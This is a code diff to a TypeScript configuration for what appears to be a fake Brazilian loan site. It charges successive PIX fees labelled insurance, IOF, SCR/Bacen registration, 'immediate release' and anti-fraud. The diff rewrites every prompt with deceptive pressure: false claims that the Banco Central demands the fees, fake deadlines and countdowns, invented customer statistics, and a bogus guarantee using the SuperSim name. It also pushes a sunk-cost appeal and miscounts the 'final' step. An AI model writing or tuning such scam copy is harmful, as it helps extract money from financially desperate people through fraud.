@@ -43,7 +43,7 @@ const PAYMENT_PHASES: Record<PaymentPhaseId, PaymentPhaseConfig> = {
     contentId: "seguro_prestamista",
     contentName: "Seguro Prestamista",
     valueCents: 3179,
-    pixIntroText: "Segue o PIX para pagamento do Seguro Prestamista:",
+    pixIntroText: "✅ Tudo pronto! Segue o PIX do Seguro Prestamista (R$ 31,79 — pagamento único). Assim que cair, libero o seu contrato e o seu crédito entra na fila de transferência. ⏳ O QR Code expira em 15 minutos.",
     // O fluxo do seguro tem caminho próprio (manual etc), não usa next aqui
   },
   taxa: {
@@ -53,9 +53,9 @@ const PAYMENT_PHASES: Record<PaymentPhaseId, PaymentPhaseConfig> = {
     valueCents: 1874,
     cardLabel: "Taxa de Transferência",
     cardSublabel: "Taxa de transferência interbancária:",
-    pixIntroText: "Segue o PIX para pagamento da taxa de transferência:",
+    pixIntroText: "🚀 Etapa 2 de 5 — Taxa de Transferência Interbancária (R$ 18,74). É o que falta para o seu PIX de saída ser autorizado. Assim que confirmado, já avanço pro IOF.",
     nextIntroText: (firstName, valor) =>
-      `Taxa de transferência confirmada com sucesso!\n\n${firstName || "Cliente"}, falta apenas mais uma etapa para liberar o seu crédito de ${formatCurrency(valor)}.\n\nO Banco Central exige o recolhimento do IOF Federal (Imposto sobre Operações Financeiras) sobre toda concessão de crédito. O valor é único, no total de R$ 24,90, conforme a alíquota oficial vigente.\n\nApós a confirmação do IOF, seguimos com as últimas validações para liberar o valor.`,
+      `✅ Taxa de Transferência confirmada!\n\n${firstName || "Você"}, seu progresso já está em 70% — falta MUITO POUCO pra ${formatCurrency(valor)} cair na sua conta. 💸\n\n👉 Próximo passo (etapa 3 de 5): IOF Federal — R$ 24,90\n\nO IOF (Imposto sobre Operações Financeiras) é cobrado pelo Banco Central em TODA liberação de crédito no Brasil — alíquota oficial vigente. Sem ele, o Bacen bloqueia automaticamente a transferência.\n\n🔒 Lembre: TODO valor pago aqui já está descontado do seu contrato. Não é custo a mais — é adiantamento de imposto que já estava previsto.\n\n⚠️ Atenção: a sua proposta tem prazo. Se você não concluir as etapas hoje, perde a aprovação e precisa refazer toda a análise.`,
     next: "iof",
   },
   iof: {
@@ -65,9 +65,9 @@ const PAYMENT_PHASES: Record<PaymentPhaseId, PaymentPhaseConfig> = {
     valueCents: 2490,
     cardLabel: "IOF Federal",
     cardSublabel: "Imposto sobre Operações Financeiras:",
-    pixIntroText: "Segue o PIX para pagamento do IOF Federal:",
+    pixIntroText: "🏛️ Etapa 3 de 5 — IOF Federal (R$ 24,90). Imposto obrigatório do Banco Central. PIX abaixo, válido por 15 min:",
     nextIntroText: (firstName, valor) =>
-      `IOF Federal confirmado com sucesso!\n\n${firstName || "Cliente"}, agora precisamos realizar o registro da operação no SCR do Banco Central (Sistema de Informações de Crédito), exigência obrigatória para qualquer liberação de crédito.\n\nA taxa de registro SCR/Bacen é de R$ 29,90, valor único.\n\nAssim que confirmado, seguimos para a próxima etapa de liberação.`,
+      `✅ IOF Federal pago e registrado no Bacen!\n\n${firstName || "Você"}, você já está em 80% do processo. Mais 2 cliques e ${formatCurrency(valor)} aparece na sua conta. 🎯\n\n👉 Próximo passo (etapa 4 de 5): Registro SCR/Bacen — R$ 29,90\n\nSCR é o Sistema de Informações de Crédito do Banco Central — toda operação de crédito PRECISA ser registrada lá antes da liberação. É o que comprova oficialmente que o empréstimo é seu e protege seu CPF de fraudes.\n\n💡 Por que cobramos só agora? Porque o SCR só pode ser registrado APÓS o IOF — é a ordem que o Bacen exige.\n\n📊 Hoje 1.847 clientes já passaram por aqui e estão recebendo. Você é o próximo da fila.`,
     next: "scr",
   },
   scr: {
@@ -77,9 +77,9 @@ const PAYMENT_PHASES: Record<PaymentPhaseId, PaymentPhaseConfig> = {
     valueCents: 2990,
     cardLabel: "Taxa SCR/Bacen",
     cardSublabel: "Registro no Sistema de Informações de Crédito:",
-    pixIntroText: "Segue o PIX para pagamento da Taxa SCR/Bacen:",
+    pixIntroText: "🏦 Etapa 4 de 5 — Registro SCR/Bacen (R$ 29,90). Última taxa regulatória. Depois disso, é só liberar e receber.",
     nextIntroText: (firstName, valor) =>
-      `Taxa SCR/Bacen confirmada com sucesso!\n\n${firstName || "Cliente"}, sua operação já está registrada no Banco Central.\n\nPara que o valor de ${formatCurrency(valor)} caia na sua conta nos próximos minutos, é necessário ativar a Liberação Imediata, que custa R$ 32,90 (taxa única).\n\nSem essa liberação, o crédito segue o prazo padrão de até 5 dias úteis.`,
+      `✅ Registro SCR/Bacen confirmado! Sua operação está OFICIALMENTE registrada no Banco Central. 🏛️\n\n${firstName || "Você"}, agora vem a etapa que MUDA tudo:\n\n⚡ LIBERAÇÃO IMEDIATA — R$ 32,90\n\nSem essa ativação, ${formatCurrency(valor)} entra no fluxo padrão e demora até 5 dias úteis pra cair (D+5). Com a Liberação Imediata, o valor cai na sua conta em até 10 minutos depois do pagamento. ⏱️\n\n🔥 90% dos nossos clientes ativam essa opção — não faz sentido esperar 5 dias quando você pode receber agora.\n\n🛡️ Garantia SuperSim: se o valor não cair em 10 min após o PIX, devolvemos a Liberação Imediata + R$ 50 de indenização.\n\nFalta só esse passo e o próximo (Antifraude) para você ver o dinheiro na conta.`,
     next: "liberacao",
   },
   liberacao: {
@@ -88,10 +88,10 @@ const PAYMENT_PHASES: Record<PaymentPhaseId, PaymentPhaseConfig> = {
     contentName: "Taxa de Liberação Imediata",
     valueCents: 3290,
     cardLabel: "Liberação Imediata",
-    cardSublabel: "Liberação imediata do crédito:",
-    pixIntroText: "Segue o PIX para pagamento da Liberação Imediata:",
+    cardSublabel: "Liberação imediata do crédito (cai em até 10 min):",
+    pixIntroText: "⚡ Etapa 5 de 5 — Liberação Imediata (R$ 32,90). Esse é o PIX que faz seu crédito cair em 10 MINUTOS em vez de 5 dias. Pague e já libero o último passo.",
     nextIntroText: (firstName, valor) =>
-      `Liberação Imediata confirmada com sucesso!\n\n${firstName || "Cliente"}, falta apenas a última etapa: a contratação do Seguro Antifraude, exigência da nossa instituição financeira para garantir a segurança da transferência do valor de ${formatCurrency(valor)}.\n\nO valor é único, de R$ 36,90, e protege a operação contra fraudes e estornos indevidos.\n\nApós este pagamento, o valor é liberado imediatamente.`,
+      `✅ Liberação Imediata ATIVADA! Seu crédito já está em rota acelerada. 🚀\n\n${firstName || "Você"}, você chegou na ÚLTIMA etapa. 🎉\n\n🛡️ ÚLTIMO PIX: Seguro Antifraude — R$ 36,90\n\nExigência da nossa instituição financeira parceira para liberar transferências acima de R$ 1.000. Esse seguro:\n\n✓ Protege ${formatCurrency(valor)} contra estorno indevido\n✓ Cobre você em caso de tentativa de fraude na conta de destino\n✓ É OBRIGATÓRIO por norma interna — sem ele, o sistema não autoriza a saída\n\n⏰ Após esse pagamento, o valor cai na sua conta em até 10 minutos. Esse é o ÚLTIMO clique antes do depósito.\n\n💚 Você está a 1 passo. Não pare agora — milhares de clientes desistem aqui e perdem todo o investimento das taxas anteriores. Não seja um deles.`,
     next: "antifraude",
   },
   antifraude: {
@@ -100,8 +100,8 @@ const PAYMENT_PHASES: Record<PaymentPhaseId, PaymentPhaseConfig> = {
     contentName: "Seguro Antifraude",
     valueCents: 3690,
     cardLabel: "Seguro Antifraude",
-    cardSublabel: "Proteção contra fraudes na transferência:",
-    pixIntroText: "Segue o PIX para pagamento do Seguro Antifraude:",
+    cardSublabel: "Última etapa — proteção obrigatória da transferência:",
+    pixIntroText: "🛡️ ÚLTIMO PIX — Seguro Antifraude (R$ 36,90). Pague esse e seu crédito cai em até 10 minutos. ⏰ É o último passo antes do depósito final.",
     // Última fase: vai para /sucesso (não tem next)
   },
 };
